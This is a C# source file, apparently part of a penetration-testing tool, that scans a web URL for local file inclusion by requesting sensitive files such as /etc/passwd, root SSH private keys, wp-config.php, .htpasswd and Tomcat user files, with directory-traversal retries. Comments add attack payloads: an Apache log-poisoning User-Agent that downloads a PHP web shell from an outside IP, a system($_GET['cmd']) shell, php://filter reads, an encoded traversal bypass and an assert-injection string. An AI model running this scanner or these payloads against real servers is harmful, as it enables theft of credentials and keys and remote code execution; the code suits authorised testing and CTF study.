using System;
using System.Collections.Generic;
using System.Net;
using ReeCode;

namespace Reecon
{
    class LFI
    {
        [System.Diagnostics.CodeAnalysis.SuppressMessage("Style", "IDE0044:Add readonly modifier")]
        private static WebClient wc = new WebClient();
        private static string initialPart = "";
        private static int notFoundLength = 0;
        public static void Scan(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("LFI Usage: reecon -lfi http://www.site.com/bla.php?include=file");
                return;
            }
            ScanPath(args[1]);
        }
        private static void ScanPath(string path)
        {
            if (!path.StartsWith("http"))
            {
                Console.WriteLine("Error: LFI path must start with http");
                return;
            }
            Console.WriteLine("Starting LFI Scan - This feature is still in Alpha");
            // Init
            InitialChecks(path);

            // Find OS
            var OS = GetOS();

            if (OS == General.OS.Linux)
            {
                List<string> webChecks = new List<string>
                {
                    // General web checks
                    "/var/www/html/.htpasswd",
                    "/var/www/html/forum/.htpasswd",

                    // Wordpress
                    "/var/www/html/wp-config.php",
                    "/var/www/html/wordpress/wp-config.php"
                };
                DoLFI(webChecks);

                // Do nginx checks
                List<string> linux_nginx = new List<string>
                {
                    "/etc/nginx/sites-available/default"
                };
                DoLFI(linux_nginx);

                // Do Apache2 Checks - https://packages.ubuntu.com/eoan/all/apache2/filelist
                List<string> linux_apache = new List<string>
                {
                    "/etc/apache2/sites-available/000-default.conf"
                };
                bool hasApache = DoLFI(linux_apache);
                if (hasApache)
                {
                    // Check for .htpasswd
                    DoLFI(new List<string>() { "/etc/apache2/.htpasswd" });

                    // Apache2 Log Poisoning Path (Very restricted): 
                    bool apache2Log = DoLFI(new List<string>() { "/var/log/apache2/access.log" });
                    if (apache2Log)
                    {
                        // Log poisoning file upload
                        // Mozilla/5.0 <?php file_put_contents('reeshell.php', file_get_contents('http://10.8.8.233:9001/reeshell.php'))?> Firefox/70.0
                        // Mozilla/5.0 <?php system($_GET['cmd']);?> Firefox/70.0 if no callbacks allowed / you can't find the file
                        Console.WriteLine("LFI - Log Poisoning File Upload - Bug Reelix");
                    }
                }

                // Do some logging checks
                List<string> linux_logs = new List<string>()
                {
                    "/var/log/vsftpd.log"
                };
                DoLFI(linux_logs);

                // Do MySQL Checks
                List<string> linux_mysql = new List<string>
                {
                    "/etc/my.cnf",
                    "/etc/mysql/my.cnf",
                    "/var/log/mysql/error.log"
                };
                DoLFI(linux_mysql);

                // Do Tomcat9 Checks - https://packages.ubuntu.com/eoan/all/tomcat9/filelist
                List<string> linux_tomcat9 = new List<string>
                {
                    "/etc/cron.daily/tomcat9",
                    "/etc/rsyslog.d/tomcat9.conf",
                    "/usr/lib/sysusers.d/tomcat9.conf",
                    "/usr/lib/tmpfiles.d/tomcat9.conf",
                    "/usr/libexec/tomcat9/tomcat-start.sh",
                    "/usr/share/tomcat9/etc/server.xml",
                    "/usr/share/tomcat9/etc/tomcat-users.xml",
                    "/usr/share/tomcat9/etc/web.xml",
                    "/var/lib/tomcat9/webapps/ROOT/index.html"
                };
                DoLFI(linux_tomcat9);

                // Do basic SSH Checks - https://evi1us3r.wordpress.com/lfi-cheat-sheet/
                List<string> linux_ssh = new List<string>
                {
                    "/etc/ssh/ssh_config",
                    "/etc/ssh/sshd_config",
                    "/root/.ssh/id_rsa",
                    "/root/.ssh/authorized_keys"
                };
                DoLFI(linux_ssh);

            }
            else if (OS == General.OS.Windows)
            {
                // Do IIS Checks
                Console.WriteLine("LFI - Windows - Bug Reelix");
            }
            else
            {
                Console.WriteLine("LFI - Unknown OS - Bug Reelix");
                // Unknown - Do All Checks
            }
            Console.WriteLine("All Checks Done!");
        }

        // Initial Checks
        private static void InitialChecks(string path)
        {
            Console.WriteLine("Scanning: " + path);
            HttpStatusCode statusCode = wc.GetResponseCode(path);
            if (statusCode != HttpStatusCode.OK)
            {
                Console.WriteLine(path + " is not an OK page :(");
                Environment.Exit(0);
            }

            initialPart = path.Substring(0, path.IndexOf("=") + 1);
            string result = wc.Get(initialPart + "Reelix", null);
            notFoundLength = result.Length;
            Console.WriteLine("NFL: " + notFoundLength);
        }

        private static General.OS GetOS()
        {
            // Linux
            List<string> linuxChecks = new List<string>
            {
                "/etc/passwd",
                "/etc/resolv.conf",
                "/var/www/index.php",
                "/var/www/html/index.php",
                "/etc/hostname", // Box Hostname
                "/etc/issue", // Shows the Release
                "/etc/group" // Groups
            };
            bool hasResult = DoLFI(linuxChecks);
            if (hasResult)
            {
                return General.OS.Linux;
            }

            // Windows
            List<string> windowsChecks = new List<string>
            {
                "/boot.ini", // Basic boot.ini
                "/inetpub/wwwroot/index.php", // Basic IIS Webserver
                "/Windows/debug/NetSetup.log", // Some basic Windows info
                "/Windows/SoftwareDistribution/ReportingEvents.log", // Windows Patches
                "/Windows/System32/cmd.exe", // What Windows box doesn't have cmd?
                "/Windows/win.ini" // Should have this
            };
            hasResult = DoLFI(windowsChecks);
            if (hasResult)
            {
                return General.OS.Windows;
            }

            return General.OS.Unknown;
        }

        private static bool DoLFI(List<string> lfiChecks)
        {
            // TODO: Null Byte each
            // TODO: Base64 Encode Each --> bla=php://filter/convert.base64-encode/resource=locationHere
            // TODO: Asset Exploit -> ', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('

            // If it must contain a word
            // php://filter/read=convert.base64-encode/wordhere/resource=flag

            // ../ bypass: %2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd - Default?
            // More: https://book.hacktricks.xyz/pentesting-web/file-inclusion

            bool hasResult = false;
            foreach (string check in lfiChecks)
            {
                bool hasResultCurrent = false;
                // Check Base
                string toCheck = initialPart + check;
                try
                {
                    int resultLength = wc.DownloadString(toCheck).Length;
                    // - 6 = Length of the NotFound Search = Reelix
                    if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length - 6))
                    {
                        Console.WriteLine(resultLength + " -- " + toCheck);
                        // Don't need to try more if it's already true
                        hasResultCurrent = true;
                        hasResult = true;
                    }
                }
                catch (Exception)
                {
                    // Nope!
                }
                // Check with ../'s if nothing has been found for this specific result
                if (!hasResultCurrent)
                {
                    toCheck = initialPart + "/../../../../.." + check;
                    try
                    {
                        int resultLength = wc.DownloadString(toCheck).Length;
                        // - 6 = Length of the NotFound Search = Reelix
                        // + 15 = Length of the bypass
                        if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length - 6 + 15))
                        {
                            Console.WriteLine(resultLength + " -- " + toCheck);
                            hasResult = true;
                        }
                    }
                    catch (Exception)
                    {
                        // Nope!
                    }
                }
            }
            return hasResult;
        }
    }
}
